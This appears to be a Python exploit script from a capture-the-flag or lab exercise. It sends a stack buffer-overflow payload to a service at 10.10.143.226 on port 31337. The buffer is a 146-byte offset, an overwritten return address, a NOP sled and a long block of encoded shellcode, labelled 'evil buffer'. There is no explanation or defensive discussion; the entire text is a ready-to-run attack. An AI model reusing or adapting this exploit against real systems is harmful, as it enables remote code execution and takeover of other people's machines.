import socket

ip = "10.10.143.226"
port = 31337

prefix = ""
offset = 146
overflow = "A" * offset
retn = "\xc3\x14\x04\x08"
padding = "\x90" * 16
payload =("\xbe\xd3\x44\xf8\xdf\xd9\xc3\xd9\x74\x24\xf4\x5d\x31\xc9"
"\xb1\x52\x31\x75\x12\x83\xed\xfc\x03\xa6\x4a\x1a\x2a\xb4"
"\xbb\x58\xd5\x44\x3c\x3d\x5f\xa1\x0d\x7d\x3b\xa2\x3e\x4d"
"\x4f\xe6\xb2\x26\x1d\x12\x40\x4a\x8a\x15\xe1\xe1\xec\x18"
"\xf2\x5a\xcc\x3b\x70\xa1\x01\x9b\x49\x6a\x54\xda\x8e\x97"
"\x95\x8e\x47\xd3\x08\x3e\xe3\xa9\x90\xb5\xbf\x3c\x91\x2a"
"\x77\x3e\xb0\xfd\x03\x19\x12\xfc\xc0\x11\x1b\xe6\x05\x1f"
"\xd5\x9d\xfe\xeb\xe4\x77\xcf\x14\x4a\xb6\xff\xe6\x92\xff"
"\x38\x19\xe1\x09\x3b\xa4\xf2\xce\x41\x72\x76\xd4\xe2\xf1"
"\x20\x30\x12\xd5\xb7\xb3\x18\x92\xbc\x9b\x3c\x25\x10\x90"
"\x39\xae\x97\x76\xc8\xf4\xb3\x52\x90\xaf\xda\xc3\x7c\x01"
"\xe2\x13\xdf\xfe\x46\x58\xf2\xeb\xfa\x03\x9b\xd8\x36\xbb"
"\x5b\x77\x40\xc8\x69\xd8\xfa\x46\xc2\x91\x24\x91\x25\x88"
"\x91\x0d\xd8\x33\xe2\x04\x1f\x67\xb2\x3e\xb6\x08\x59\xbe"
"\x37\xdd\xce\xee\x97\x8e\xae\x5e\x58\x7f\x47\xb4\x57\xa0"
"\x77\xb7\xbd\xc9\x12\x42\x56\xfc\xec\x18\xe9\x68\xf3\xa0"
"\xe4\x34\x7a\x46\x6c\xd5\x2a\xd1\x19\x4c\x77\xa9\xb8\x91"
"\xad\xd4\xfb\x1a\x42\x29\xb5\xea\x2f\x39\x22\x1b\x7a\x63"
"\xe5\x24\x50\x0b\x69\xb6\x3f\xcb\xe4\xab\x97\x9c\xa1\x1a"
"\xee\x48\x5c\x04\x58\x6e\x9d\xd0\xa3\x2a\x7a\x21\x2d\xb3"
"\x0f\x1d\x09\xa3\xc9\x9e\x15\x97\x85\xc8\xc3\x41\x60\xa3"
"\xa5\x3b\x3a\x18\x6c\xab\xbb\x52\xaf\xad\xc3\xbe\x59\x51"
"\x75\x17\x1c\x6e\xba\xff\xa8\x17\xa6\x9f\x57\xc2\x62\xbf"
"\xb5\xc6\x9e\x28\x60\x83\x22\x35\x93\x7e\x60\x40\x10\x8a"
"\x19\xb7\x08\xff\x1c\xf3\x8e\xec\x6c\x6c\x7b\x12\xc2\x8d"
"\xae")
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
